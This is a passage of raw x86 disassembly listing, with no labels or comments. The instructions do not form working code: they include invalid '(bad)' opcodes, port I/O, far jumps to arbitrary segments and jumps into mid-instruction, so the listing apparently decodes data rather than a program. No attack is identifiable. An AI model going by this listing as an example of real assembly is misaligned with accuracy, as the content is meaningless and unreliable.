  4369dc:	add    esp,DWORD PTR [ecx+0x14]
  4369df:	cli    
  4369e0:	fsub   QWORD PTR [esi]
  4369e2:	(bad)  
  4369e6:	push   eax
  4369e7:	add    ebx,DWORD PTR [esi+0x67]
  4369ea:	in     eax,0xe1
  4369ec:	je     0x436a3a
  4369ee:	xchg   esp,eax
  4369ef:	nop
  4369f0:	ja     0x436a52
  4369f2:	and    DWORD PTR [edx-0x5],esi
  4369f5:	inc    edi
  4369f6:	sbb    bl,ch
  4369f8:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4369fa:	pop    ds
  4369fb:	int3   
  4369fc:	and    ah,BYTE PTR [ecx+0x3]
  4369ff:	out    0xb5,eax
  436a01:	fist   DWORD PTR [edi]
  436a03:	dec    eax
  436a05:	pusha  
  436a06:	popa   
  436a07:	cli    
  436a08:	leave  
  436a09:	push   cs
  436a0a:	push   edi
  436a0b:	out    dx,al
  436a0c:	add    eax,ebp
  436a0e:	out    dx,al
  436a0f:	cdq    
  436a10:	jl     0x436a19
  436a12:	popf   
  436a13:	fcom   QWORD PTR [esi-0x265ec50d]
  436a19:	and    DWORD PTR [edx],esp
  436a1b:	stos   DWORD PTR es:[edi],eax
  436a1c:	xor    bh,ah
  436a1e:	push   cs
  436a1f:	sub    eax,0xcb61345e
  436a24:	aam    0x3
  436a26:	aad    0xb8
  436a28:	jmp    0x41f8:0xfba42aac
  436a2f:	dec    esp
  436a30:	cmp    eax,0x8ddc6eb9
  436a35:	and    esi,ebp
  436a37:	into   
  436a38:	jg     0x436a5c
  436a3a:	or     al,0xe6
  436a3c:	and    DWORD PTR [esi-0x45fe68c7],edx
  436a42:	push   eax
  436a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436a44:	or     DWORD PTR [ebp+0x1b],edx
  436a47:	je     0x4369de
  436a49:	fld    TBYTE PTR [eax+0x72]
  436a4c:	loope  0x4369ed
  436a4e:	gs sub ch,0x94
  436a52:	dec    ebp
  436a53:	rcr    BYTE PTR [esi-0xd],cl
  436a56:	js     0x436a25
  436a58:	test   eax,0x372a3099
  436a5d:	popa   
  436a5e:	mov    eax,0xd8e9c896
  436a63:	jnp    0x436a64
  436a65:	in     eax,dx
  436a66:	out    dx,al
  436a67:	add    BYTE PTR [edi],bl
  436a69:	in     eax,dx
  436a6a:	ins    BYTE PTR es:[edi],dx
  436a6b:	jo     0x436a5b
  436a6d:	aaa    
  436a6e:	aam    0xc4
  436a70:	(bad)  
  436a71:	enter  0xa127,0xd7
  436a75:	pop    edx
  436a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436a77:	xchg   edx,eax
  436a78:	mov    edi,0x71cfee8e
  436a7d:	ret    0xbbd2
  436a80:	arpl   WORD PTR [ebx+esi*1-0x55],sp
  436a84:	pop    edx
  436a85:	mov    ecx,0xc98054ee
  436a8a:	xchg   ebp,eax
  436a8b:	xlat   BYTE PTR ds:[ebx]
  436a8c:	mov    ds:0xb68ceb24,eax
  436a91:	push   0xffffff88
  436a93:	jb     0x436a59
  436a95:	nop
  436a96:	fdivr  QWORD PTR [esi-0x69]
  436a99:	pusha  
  436a9a:	pop    esi
  436a9b:	push   0x66e94400
  436aa0:	pop    esp
  436aa1:	sub    dh,ch
  436aa3:	cdq    
  436aa4:	test   al,0x63
  436aa6:	aaa    
  436aa7:	pop    ss
  436aa8:	call   0x8c91:0xf1a115ed
  436aaf:	mov    ds:0xceb76ed1,al
  436ab4:	arpl   WORD PTR [ecx+0x58],cx
  436ab7:	ds cwde 
  436ab9:	and    ch,cl
  436abb:	jmp    FWORD PTR [edi-0x2c5edc0e]
  436ac1:	stc    
  436ac2:	aad    0xaa
  436ac4:	sbb    ebp,ebx
  436ac6:	sti    
  436ac7:	mov    bh,0x5e
  436ac9:	enter  0x7d03,0x54
  436acd:	iret   
  436ace:	ficom  DWORD PTR [edx+0x79b25172]
  436ad4:	adc    al,0x98
  436ad6:	imul   edi,DWORD PTR cs:[ebx+0x30],0x1a
  436adb:	aam    0x36
  436add:	out    dx,al
  436ade:	lds    esp,FWORD PTR [eax+0x2c620903]
  436ae4:	int3   
  436ae5:	lods   eax,DWORD PTR ds:[si]
  436ae7:	mov    al,ds:0x5b289e1f
  436aec:	xchg   DWORD PTR [ecx+0x54],edx
  436aef:	jns    0x436b4a
  436af1:	cbw    
  436af3:	repz xchg edi,eax
  436af5:	call   0x89412b28
  436afa:	adc    ah,BYTE PTR [ecx-0x31262fdd]
  436b00:	dec    esi
  436b01:	in     eax,0x45
  436b03:	cmp    DWORD PTR [edx+0x47],edx
  436b06:	push   edx
  436b07:	ins    DWORD PTR es:[edi],dx
  436b08:	out    0x85,eax
  436b0a:	jmp    0x4bbe172f
  436b0f:	(bad)  
  436b10:	rcl    BYTE PTR [eax],cl
  436b12:	idiv   DWORD PTR [eax+0x16]
  436b15:	popa   
  436b16:	xchg   ebx,eax
  436b17:	stc    
  436b18:	iretw  
  436b1a:	aas    
  436b1b:	jns    0x436b06
  436b1d:	mov    dh,0xe7
  436b1f:	shr    al,0xa
  436b22:	into   
  436b23:	xchg   esp,eax
  436b24:	(bad)  
  436b25:	pop    ss
  436b26:	adc    al,0x44
  436b28:	or     DWORD PTR [ecx-0x51],esp
  436b2b:	push   ecx
  436b2c:	scas   eax,DWORD PTR es:[edi]
  436b2d:	ficom  WORD PTR [eax-0x5d]
  436b30:	gs jnp 0x436b23
  436b33:	in     eax,0xb9
  436b35:	mov    eax,0x93f32371
  436b3a:	jnp    0x436b3d
  436b3c:	mov    bl,0x5
  436b3e:	hlt    
  436b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436b40:	jmp    0xd3e0:0xe091926
  436b47:	repz pop eax
  436b49:	and    ebx,DWORD PTR [esi-0xd9eaabc]
  436b4f:	aam    0x34
  436b51:	shl    eax,cl
  436b53:	imul   esp,edx,0xa
  436b56:	out    dx,al
  436b57:	xchg   esp,eax
  436b58:	adc    dh,BYTE PTR [ecx+0x18ce2601]
  436b5e:	adc    BYTE PTR [eax-0x7a371aac],ch
  436b64:	lahf   
  436b65:	add    BYTE PTR [ecx],bh
  436b67:	stos   BYTE PTR es:[edi],al
  436b68:	jbe    0x436b6b
  436b6a:	out    dx,al
  436b6b:	jmp    0xb32b598e
  436b70:	in     eax,dx
  436b71:	ins    BYTE PTR es:[edi],dx
  436b72:	call   0x7642c617
  436b77:	fnsave [ebp-0x52]
  436b7a:	jge    0x436bdc
  436b7c:	pop    ebp
  436b7d:	loope  0x436b74
  436b7f:	mov    eax,esp
  436b81:	jnp    0x436bb1
  436b83:	sub    DWORD PTR [edx+0x5d],0xdfcba0d5
  436b8a:	imul   ebx,DWORD PTR [edi+edx*1],0x5357e830
  436b91:	call   0x70223dac
  436b96:	sub    ax,0x5450
  436b9a:	popf   
  436b9b:	neg    BYTE PTR ds:0xf4233874
  436ba1:	push   ebx
  436ba2:	out    dx,al
  436ba3:	xchg   esi,eax
  436ba4:	xchg   edx,eax
  436ba5:	or     al,0xe7
  436ba7:	data16 jg 0x436c23
  436baa:	jg     0x436bd2
  436bac:	push   cs
  436bad:	iret   
  436bae:	ret    0x7c10
  436bb1:	pop    ebp
  436bb2:	sub    al,0x31
  436bb4:	mov    ecx,0x7b816639
  436bb9:	jp     0x436c26
  436bbb:	mov    ds:0x3a34e2c7,al
  436bc0:	xchg   BYTE PTR [ebp+0x85b851b],dl
  436bc6:	mov    dl,0xee
  436bc8:	outs   dx,DWORD PTR ds:[esi]
  436bc9:	pusha  
  436bca:	adc    al,0x64
  436bcc:	shl    BYTE PTR [edi+0x872d78b],0x4d
  436bd3:	sub    BYTE PTR [esi-0x2d],bl
  436bd6:	ins    DWORD PTR es:[edi],dx
  436bd7:	cmp    BYTE PTR [ecx],bh
  436bd9:	mov    ds:0xe7702b1e,al
  436bde:	out    dx,al
  436bdf:	lahf   
  436be0:	aad    0x49
  436be2:	stos   BYTE PTR es:[edi],al
  436be3:	rcl    BYTE PTR [ebp-0xa6027bc],1
  436be9:	pop    esp
  436bea:	cmp    al,0x34
  436bec:	xor    BYTE PTR [ecx+0x69],ah
  436bef:	bound  edi,QWORD PTR [ebp+0x531d0bc8]
  436bf5:	xor    BYTE PTR [ecx+0x5579de32],bl
  436bfb:	and    DWORD PTR [ebx],0x6ca2e36a
  436c01:	mov    edx,DWORD PTR [esi]
  436c03:	sti    
  436c04:	jae    0x436c79
  436c06:	outs   dx,BYTE PTR ds:[esi]
  436c07:	push   eax
  436c08:	fwait
  436c09:	gs add al,0xd9
  436c0c:	pop    ebx
  436c0d:	mov    eax,0x19d8ca7d
  436c12:	sahf   
  436c13:	scas   al,BYTE PTR es:[edi]
  436c14:	les    eax,FWORD PTR [ecx]
  436c16:	dec    edi
  436c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436c18:	js     0x436c44
  436c1a:	mov    esi,0x5e27c243
  436c1f:	cmp    BYTE PTR [eax-0x184b1121],dh
  436c25:	enter  0xddc7,0xa
  436c29:	mov    BYTE PTR [ebp-0x69],0xe0
  436c2d:	or     BYTE PTR [ebx-0x2ea68687],ah
  436c33:	lahf   
  436c34:	jg     0x436c4d
  436c36:	ds sbb BYTE PTR gs:[ebp+esi*8-0x3a],bl
  436c3c:	xchg   ebp,eax
  436c3d:	xor    al,bl
  436c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436c40:	push   esp
  436c41:	and    BYTE PTR [ecx],dl
  436c43:	mov    eax,ds:0x7b17128f
  436c48:	pop    esi
  436c49:	sbb    al,0xda
  436c4b:	push   ss
  436c4c:	mov    ch,0x57
  436c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436c4f:	adc    eax,ebx
  436c51:	pusha  
  436c52:	adc    DWORD PTR [edx+0x13ecd067],0x11
  436c59:	rol    al,cl
  436c5b:	ss mov esi,0xaea1be7b
  436c61:	std    
  436c62:	enter  0xc15c,0x4a
  436c66:	mov    esp,0xfa7e7ce0
  436c6b:	bound  ebx,QWORD PTR [esi+0x38]
  436c6e:	inc    edx
  436c6f:	jne    0x436c90
  436c71:	sti    
  436c72:	xor    BYTE PTR [ebx-0x5d4dd732],cl
  436c78:	and    eax,0xa5619e3e
  436c7d:	dec    eax
  436c7e:	stos   DWORD PTR es:[edi],eax
  436c7f:	std    
  436c80:	(bad)  
  436c81:	scas   eax,DWORD PTR es:[edi]
  436c82:	sahf   
  436c83:	out    dx,eax
  436c84:	mov    WORD PTR [ebx-0x9],fs
  436c87:	push   eax
  436c88:	inc    eax
  436c89:	in     al,dx
  436c8a:	in     eax,dx
  436c8b:	mov    WORD PTR [eax-0x31],ds
  436c8e:	fadd   DWORD PTR [edx+ebx*4+0x2aa22924]
  436c95:	imul   edx,esp,0x1d
  436c98:	sbb    edi,ecx
  436c9a:	enter  0x7f84,0x53
  436c9e:	not    ecx
  436ca0:	imul   edx,DWORD PTR [esi+0x79a37eee],0x52
  436ca7:	and    al,0x35
  436ca9:	pop    esp
  436caa:	rcl    DWORD PTR [ecx],1
  436cac:	lahf   
  436cad:	outs   dx,DWORD PTR ds:[esi]
  436cae:	aas    
  436caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436cb0:	jle    0x436c8a
  436cb2:	push   edi
  436cb3:	and    DWORD PTR [edi+0x5e8ef5ee],edx
  436cb9:	out    dx,al
  436cba:	and    ch,0xd1
  436cbd:	mov    cl,0xde
  436cbf:	sbb    cl,bh
  436cc1:	and    al,0xa5
  436cc3:	mov    eax,ds:0xf5a3a294
  436cc8:	mov    DWORD PTR [eax],edx
  436cca:	pop    ebx
  436ccb:	xor    bl,BYTE PTR [esi-0x5a]
  436cce:	daa    
  436ccf:	lds    eax,FWORD PTR [ebp+0x7a09210c]
  436cd5:	pop    ecx
  436cd6:	test   DWORD PTR ds:0x174cfdb,eax
  436cdc:	adc    DWORD PTR [ebx],ebp
  436cde:	fnstcw WORD PTR [ebx]
  436ce0:	pop    ebx
  436ce1:	imul   eax,DWORD PTR [ecx+0x7efda9fe],0x75
  436ce8:	mov    dl,BYTE PTR [ebx+0x42]
  436ceb:	mov    eax,ds:0x1c6bf68b
  436cf0:	je     0x436cd4
  436cf2:	neg    DWORD PTR [ecx]
  436cf4:	pop    esi
  436cf5:	addps  xmm5,XMMWORD PTR [esi]
  436cf8:	ds (bad) 
  436cfb:	fld    QWORD PTR [edi-0xcf057a0]
  436d01:	push   ebp
  436d02:	data16 mov ah,0x65
  436d05:	jmp    0x436cf5
  436d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436d08:	sbb    BYTE PTR [esi+eax*2-0x11],ch
  436d0c:	stos   BYTE PTR es:[edi],al
  436d0d:	or     eax,0x94e8a15c
  436d12:	mov    ss,WORD PTR [ebx]
  436d14:	push   0xebf92550
  436d19:	ja     0x436d3d
  436d1b:	mov    bl,ch
  436d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436d1e:	out    dx,al
  436d1f:	inc    edi
  436d20:	out    0xb3,al
  436d22:	shr    DWORD PTR [ebx-0x3d],1
  436d25:	mov    dl,BYTE PTR [eax-0x64]
  436d28:	push   esp
  436d29:	int3   
  436d2a:	pop    ecx
  436d2b:	push   cs
  436d2c:	pop    esi
  436d2d:	mov    ds:0x5824217c,eax
  436d32:	sahf   
  436d33:	adc    DWORD PTR [ebx+ecx*8-0xc],0x1d
  436d38:	and    al,0xad
  436d3a:	lock mov al,ds:0x9fb41643
  436d40:	cmp    al,0x61
  436d42:	sbb    bh,BYTE PTR [ebp-0xf]
  436d45:	dec    ebp
  436d46:	aam    0x18
  436d48:	loope  0x436d41
  436d4a:	out    dx,al
  436d4b:	lock mov ch,0xda
  436d4e:	add    eax,0x2b3a1f7f
  436d53:	stos   DWORD PTR es:[edi],eax
  436d54:	xchg   ebp,eax
  436d55:	aas    
  436d56:	out    dx,al
  436d57:	ror    DWORD PTR [esi-0x4a],0xe1
  436d5b:	pusha  
  436d5c:	stos   DWORD PTR es:[edi],eax
  436d5d:	cmc    
  436d5e:	out    dx,al
  436d5f:	sbb    BYTE PTR [ebp+0x539af886],0xf9
  436d66:	xchg   DWORD PTR [ebx+0x30e85fd6],eax
  436d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436d6d:	or     DWORD PTR [ecx+0x1b],esi
  436d70:	cmp    eax,0x5e381f89
  436d75:	add    dh,al
  436d77:	cli    
  436d78:	shl    DWORD PTR ds:0x521c8937,cl
  436d7e:	mov    dh,0x7e
  436d80:	and    eax,0x2156477d
  436d85:	xor    DWORD PTR [eax+0xc],0xc0eed6d8
  436d8c:	jmp    ebx
  436d8e:	cmp    al,0x10
  436d90:	inc    edx
  436d91:	sbb    al,ah
  436d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436d94:	data16 icebp 
  436d96:	mov    gs,WORD PTR ss:[edx-0x80]
  436d9a:	inc    edx
  436d9b:	div    BYTE PTR [di]
  436d9e:	in     eax,dx
  436d9f:	add    ebp,DWORD PTR [ecx-0x6ce7376d]
  436da5:	jnp    0x436dd9
  436da7:	mov    cl,0xe0
  436da9:	pop    ecx
  436daa:	and    BYTE PTR [esi],ch
  436dac:	fwait
  436dad:	icebp  
  436dae:	in     al,0x90
  436db0:	arpl   WORD PTR [edx],si
  436db2:	and    edx,esp
  436db4:	pop    esi
  436db5:	mov    ?,WORD PTR [eax-0x12]
  436db8:	mov    eax,0xd6bcf1d1
  436dbd:	inc    esp
  436dbe:	mov    ecx,0x4de0788e
  436dc3:	jo     0x436d76
  436dc5:	js     0x436e1a
  436dc7:	ja     0x436e27
  436dc9:	test   BYTE PTR [edx-0x61],al
  436dcc:	mov    ecx,DWORD PTR [esi+0x2ce9af25]
  436dd2:	mov    eax,fs:0x41bffa3e
  436dd8:	sub    BYTE PTR [edi],0xe0
  436ddb:	or     BYTE PTR [ebx+edx*2-0x49],al
  436ddf:	fstp   QWORD PTR [edi-0x5b]
  436de2:	rcr    BYTE PTR [edi],cl
  436de4:	push   ebx
  436de5:	mov    ecx,0xb507527f
  436dea:	ret    0xfaa0
  436ded:	push   esi
  436dee:	add    al,0xbd
  436df0:	(bad)  
  436df1:	int3   
  436df2:	xchg   edx,eax
  436df3:	rcr    BYTE PTR [esi+0x4e],0xf9
  436df7:	xchg   ah,ah
  436df9:	fimul  WORD PTR ds:0x7b60b282
  436dff:	lock ret 
  436e01:	pop    edx
  436e02:	mov    ah,0xb0
  436e04:	mov    esi,0xad2899e3
  436e09:	jmp    0x910e:0x1fb4cb5d
  436e10:	sub    eax,0x75680b61
  436e15:	je     0x436dec
  436e17:	jl     0x436de7
  436e19:	push   ss
  436e1a:	out    dx,al
  436e1b:	test   al,0x84
  436e1d:	mov    ch,BYTE PTR [edi-0x4]
  436e20:	inc    eax
  436e21:	(bad)  
  436e22:	jmp    0x95cd70c8
  436e27:	leave  
  436e28:	clc    
  436e29:	neg    dh
  436e2b:	push   esp
  436e2c:	sar    BYTE PTR [edx-0x3fa20912],cl
  436e32:	add    DWORD PTR [ebx-0x11],esi
  436e35:	jnp    0x436e30
  436e37:	mov    al,ds:0xc87ab101
  436e3c:	add    esi,DWORD PTR [ebp+ecx*8-0x11c61225]
  436e43:	inc    esi
  436e44:	mov    edi,0xffe84eb5
  436e49:	(bad)  
  436e4a:	mov    eax,0x598666a0
  436e4f:	stos   BYTE PTR es:[edi],al
  436e50:	add    bl,BYTE PTR [eax]
  436e52:	loope  0x436e99
  436e54:	pop    esi
  436e55:	into   
  436e56:	and    bh,BYTE PTR [edx-0x65]
  436e59:	cmp    al,0x3e
  436e5b:	inc    esp
  436e5c:	ja     0x436ebe
  436e5e:	mov    esp,0xd347b517
  436e63:	jp     0x436e35
  436e65:	pop    ebp
  436e66:	out    dx,eax
  436e67:	jg     0x436e85
  436e69:	and    eax,0x9d052167
  436e6e:	aas    
  436e6f:	jbe    0x436ec2
  436e71:	popa   
  436e72:	jg     0x436ea5
  436e74:	add    al,al
  436e76:	jl     0x436e84
  436e78:	stc    
  436e79:	je     0x436e69
  436e7b:	inc    ecx
  436e7c:	mov    ah,0x66
  436e7e:	mov    ah,BYTE PTR [ebx]
  436e80:	fnstsw WORD PTR ds:0xf201a120
  436e86:	and    dh,dh
  436e88:	inc    ebx
  436e89:	mov    eax,0x865d89b7
  436e8e:	fcmovu st,st(0)
  436e90:	mov    al,0x42
  436e92:	jno    0x436eac
  436e94:	sbb    bl,BYTE PTR ds:[ecx+eiz*4]
  436e98:	dec    eax
  436e99:	aas    
  436e9a:	rcl    ebp,cl
  436e9c:	xchg   ecx,eax
  436e9d:	add    eax,0x5f5dd14b
  436ea2:	std    
  436ea3:	cwde   
  436ea4:	jae    0x436e9b
  436ea6:	dec    ecx
  436ea7:	push   edx
  436ea8:	ds popf 
  436eaa:	inc    esi
  436eab:	lods   al,BYTE PTR ds:[esi]
  436eac:	aaa    
  436ead:	bound  ebp,QWORD PTR [esi-0x37]
  436eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436eb1:	adc    BYTE PTR [edi+0x4e709803],bh
  436eb7:	enter  0xfa31,0xc5
  436ebb:	out    dx,al
  436ebc:	pop    esi
  436ebd:	xor    DWORD PTR [esi+0xe],edi
  436ec0:	xor    edi,edx
  436ec2:	cmp    BYTE PTR [edi+0x1eb260b5],0x4
  436ec9:	mov    ch,0x2e
  436ecb:	jmp    0x436eaa
  436ecd:	shl    edi,cl
  436ecf:	mov    DWORD PTR [eax+0x4ebd5f88],0xec0b13f
  436ed9:	popa   
  436eda:	div    esp
  436edc:	ss jmp 0xb7f278e4
  436ee2:	out    dx,al
  436ee3:	jmp    0xbb52734e
  436ee8:	jae    0x436e7e
  436eea:	scas   al,BYTE PTR es:[edi]
  436eeb:	mov    ds:0x875def0a,al
  436ef0:	sub    dh,BYTE PTR [esi+0x6e]
  436ef3:	inc    ebx
  436ef4:	or     esi,edx
  436ef6:	pop    es
  436ef7:	and    al,0x5e
  436ef9:	xchg   edi,eax
  436efa:	dec    edi
  436efb:	pop    esp
  436efc:	dec    ebp
  436efd:	sub    esi,edi
  436eff:	mov    bh,0x34
  436f01:	test   eax,0xf549a22c
  436f06:	iret   
  436f07:	addr16 mov ebp,0x5c20f68f
  436f0d:	and    BYTE PTR [ecx-0x1dcaad2d],al
  436f13:	mov    al,ds:0xa2d7fbf3
  436f18:	dec    ebx
  436f19:	outs   dx,DWORD PTR ds:[esi]
  436f1a:	pusha  
  436f1b:	mov    dh,0x64
  436f1d:	std    
  436f1e:	or     ebx,DWORD PTR [ebx+edi*2+0x20]
  436f22:	xor    eax,0x11ee611f
  436f27:	mov    al,0x26
  436f29:	sub    BYTE PTR [esi-0x23],0x58
  436f2d:	sbb    bh,BYTE PTR [edx]
  436f2f:	sbb    ch,BYTE PTR [edx+0x0]
  436f32:	add    BYTE PTR [eax+0x212e63ef],ch
  436f38:	retf   0x5618
  436f3b:	xchg   BYTE PTR [eax+eiz*2+0x4da03344],dh
  436f42:	in     al,dx
  436f43:	out    0xad,eax
  436f45:	lods   eax,DWORD PTR ds:[esi]
  436f46:	out    dx,al
  436f47:	add    DWORD PTR [ebx+ecx*1-0x32d01931],esp
  436f4e:	push   ss
  436f4f:	mov    al,ds:0x3d489dba
  436f54:	mov    dh,al
  436f56:	out    dx,al
  436f57:	cmp    eax,0xfb99294a
  436f5c:	dec    eax
  436f5d:	lods   al,BYTE PTR ds:[esi]
  436f5e:	out    0x11,eax
  436f60:	cs inc edx
  436f62:	jl     0x436f0f
  436f64:	cs pop edi
  436f66:	lahf   
  436f67:	push   edx
  436f68:	stos   DWORD PTR es:[edi],eax
  436f69:	pusha  
  436f6a:	inc    edx
  436f6b:	(bad)  
  436f6c:	dec    esi
  436f6d:	jg     0x436f38
  436f6f:	mov    ch,0xc6
  436f71:	cmc    
  436f72:	in     eax,dx
  436f73:	dec    edx
  436f74:	mov    esp,0xced71445
  436f79:	jo     0x436fcd
  436f7b:	sub    al,BYTE PTR [ebx]
  436f7d:	popa   
  436f7e:	mov    al,0x72
  436f80:	adc    DWORD PTR [edx+0x7b74ca66],esp
  436f86:	arpl   WORD PTR fs:[edi-0x59],bx
  436f8a:	retf   0xda1b
  436f8d:	or     al,0x44
  436f8f:	push   ecx
  436f90:	dec    ebx
  436f91:	mov    BYTE PTR [ecx-0x5f],dl
  436f94:	out    dx,eax
  436f95:	lods   al,BYTE PTR ds:[esi]
  436f96:	mov    dl,0xe8
  436f98:	dec    esp
  436f99:	imul   edx,DWORD PTR [esi+0x3f],0x5e
  436f9d:	mov    bl,0xfb
  436f9f:	jbe    0x436ff1
  436fa1:	mov    ds:0x291ad3d6,al
  436fa6:	jp     0x436f9f
  436fa8:	sbb    ebx,DWORD PTR [esi+0x2e]
  436fab:	test   al,0x36
  436fad:	call   0xbcd9b5e6
  436fb2:	sbb    eax,0x1b465ee6
  436fb7:	push   0xed972c9d
  436fbc:	mul    DWORD PTR [eax-0xd]
  436fbf:	push   es
  436fc0:	iret   
  436fc1:	mov    BYTE PTR gs:[edx-0x5611d6e2],dl
  436fc8:	in     al,0x6e
  436fca:	test   eax,0x3dc41b4c
  436fcf:	ja     0x436fd5
  436fd1:	popa   
  436fd2:	push   ecx
  436fd3:	push   ebx
  436fd4:	pop    eax
  436fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436fd6:	dec    esp
  436fd7:	mov    esi,0xd5eea869
  436fdc:	lar    esp,cx
  436fdf:	test   DWORD PTR fs:[ecx+0x5e],0x559606a8
  436fe7:	ds mov dh,0x70
  436fea:	call   0x1744:0xc269fefe
  436ff1:	pop    esi
  436ff2:	fsub   QWORD PTR [esi+0x4b]
  436ff5:	clc    
  436ff6:	ds xor esi,0xfba15d73
  436ffd:	clc    
  436ffe:	push   ebx
  436fff:	push   ebx
  437000:	jb     0x436fdb
  437002:	in     al,dx
  437003:	jo     0x437060
  437005:	leave  
  437006:	and    DWORD PTR [edx+0x2e1e6a81],eax
  43700c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43700d:	adc    BYTE PTR [edi+0x79],0x10
  437011:	inc    edx
  437012:	add    DWORD PTR [ebx-0x1e6be1ba],ecx
  437018:	adc    ecx,DWORD PTR [esi+esi*2-0x11c4ff53]
  43701f:	push   edx
  437020:	popf   
  437021:	cmp    dl,bl
  437023:	push   cs
  437024:	arpl   WORD PTR [ebx+0x12],bp
  437027:	mov    eax,ds:0xa541b299
  43702c:	in     al,dx
  43702d:	cmc    
  43702e:	mov    dl,0x83
  437030:	pop    esi
  437031:	loope  0x43709a
  437033:	mov    eax,0x5fdacd9
  437038:	and    DWORD PTR [eax-0x64],0x4acbdf09
  43703f:	xchg   esp,eax
  437040:	(bad)  
  437041:	popf   
  437042:	out    dx,al
  437043:	js     0x436fd5
  437045:	pop    ebp
  437046:	mov    al,0x4
  437048:	and    eax,0x3da11894
  43704d:	mov    WORD PTR [edi-0x23],fs
  437050:	sar    DWORD PTR [edx-0x40],1
  437053:	mov    edx,0xe4ee5cec
  437058:	fidiv  DWORD PTR [ebx]
  43705a:	dec    ebp
  43705b:	sbb    eax,0xa0623ad4
  437060:	xor    al,0xa
  437062:	loope  0x437059
  437064:	push   ds
  437065:	in     al,0x8f
  437067:	cwde   
  437068:	adc    DWORD PTR [ebp+0x7aaf40ee],0x22880605
  437072:	jecxz  0x437000
  437074:	gs inc edi
  437076:	mov    BYTE PTR [ecx-0x12],ah
  437079:	xlat   BYTE PTR ds:[ebx]
  43707a:	rol    DWORD PTR [ecx+edi*1+0x7f],0xee
  43707f:	push   0x3e
  437081:	inc    esi
  437082:	xlat   BYTE PTR ds:[ebx]
  437083:	dec    edx
  437084:	sbb    al,0xaf
  437086:	call   0x8e84818a
  43708b:	and    eax,0x49a359d4
  437090:	pop    esi
  437091:	repnz inc edx
  437093:	xor    eax,0xff5862db
  437098:	ins    DWORD PTR es:[edi],dx
  437099:	pusha  
  43709a:	sub    eax,DWORD PTR [ecx]
  43709c:	pop    edx
  43709d:	inc    ebx
  43709e:	push   edx
  43709f:	jbe    0x4370e3
  4370a1:	dec    esi
  4370a2:	out    dx,al
  4370a3:	jg     0x4370f6
  4370a5:	jbe    0x4370ef
  4370a7:	popa   
  4370a8:	or     BYTE PTR [ecx+0x53],bl
  4370ab:	mov    eax,ds:0x3beabc8e
  4370b0:	ss pop ds
  4370b2:	adc    al,0xd6
  4370b4:	pop    esi
  4370b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4370b6:	into   
  4370b7:	jo     0x4370ed
  4370b9:	shl    edx,0x8a
  4370bc:	lods   al,BYTE PTR ds:[esi]
  4370bd:	pusha  
  4370be:	ins    DWORD PTR es:[edi],dx
  4370bf:	mov    dh,0xec
  4370c1:	adc    ch,al
  4370c3:	icebp  
  4370c4:	ss je  0x4370b5
  4370c7:	xchg   edx,eax
  4370c8:	mov    ds:0x996c78a8,al
  4370cd:	stc    
  4370ce:	pop    esp
  4370cf:	mov    eax,ds:0x58e56b27
  4370d4:	jno    0x4370f9
  4370d6:	sahf   
  4370d7:	and    al,0x6f
  4370d9:	jo     0x4370c6
  4370db:	outs   dx,BYTE PTR ds:[esi]
  4370dc:	pop    esi
  4370dd:	fld    st(0)
  4370df:	jge    0x43712f
  4370e1:	adc    DWORD PTR [eax-0x449f25c0],esp
  4370e7:	xchg   edi,eax
  4370e8:	ins    BYTE PTR es:[edi],dx
  4370e9:	retf   
  4370ea:	in     al,0x86
  4370ec:	sub    bh,dh
  4370ee:	out    dx,eax
  4370ef:	jmp    0xe120e095
  4370f4:	mov    al,0xcf
  4370f6:	mov    ch,0x29
  4370f8:	aaa    
  4370f9:	popa   
  4370fa:	jb     0x437168
  4370fc:	repz inc esp
  4370fe:	std    
  4370ff:	push   ss
  437100:	xor    bh,BYTE PTR [eax+eax*1+0x45]
  437104:	out    dx,al
  437105:	sub    al,0x6e
  437107:	mov    eax,0xe42e8563
  43710c:	xor    cl,ch
  43710e:	std    
  43710f:	call   0x60de:0x520d5860
  437116:	and    BYTE PTR [edi+esi*8],dl
  437119:	mov    DWORD PTR [ecx+0x66],ecx
  43711c:	pop    ebx
  43711d:	inc    edi
  43711e:	arpl   WORD PTR [ebp-0x7818fd45],di
  437124:	arpl   cx,ax
  437126:	(bad)  
  437127:	and    eax,0x8e994ce
  43712c:	jb     0x43718e
  43712e:	mov    eax,eax
  437130:	das    
  437131:	popf   
  437132:	xor    bl,BYTE PTR fs:[edi-0x1c6111bf]
  437139:	xchg   ebp,eax
  43713a:	jge    0x4370e5
  43713c:	push   ecx
  43713d:	mov    bh,0x9b
  43713f:	mov    ds:0x23d308a3,eax
  437144:	adc    DWORD PTR [ebx],eax
  437146:	cs cli 
  437148:	hlt    
  437149:	dec    ebx
  43714a:	out    dx,al
  43714b:	repnz inc eax
  43714d:	inc    ebp
  43714e:	cmp    esp,DWORD PTR [ebx-0x5ee972e3]
  437154:	ins    BYTE PTR es:[edi],dx
  437155:	jo     0x437123
  437157:	ret    
  437158:	push   esp
  437159:	mov    ebp,0x855eff98
  43715e:	adc    BYTE PTR [ebx-0x29],al
  437161:	push   es
  437162:	sbb    eax,0x1ab95886
  437167:	mov    eax,ds:0xf7c5519c
  43716c:	(bad)  
  43716d:	sub    bh,BYTE PTR [edx-0x12afdde6]
  437173:	mov    al,ds:0xd78dbe81
  437178:	clc    
  437179:	sahf   
  43717a:	and    ah,BYTE PTR [ecx+0x73dee5f1]
  437180:	jecxz  0x437174
  437182:	adc    BYTE PTR [esi],dl
  437184:	pop    esi
  437185:	neg    bl
  437187:	pop    ebp
  437188:	mov    edi,0xb44a91fb
  43718d:	pusha  
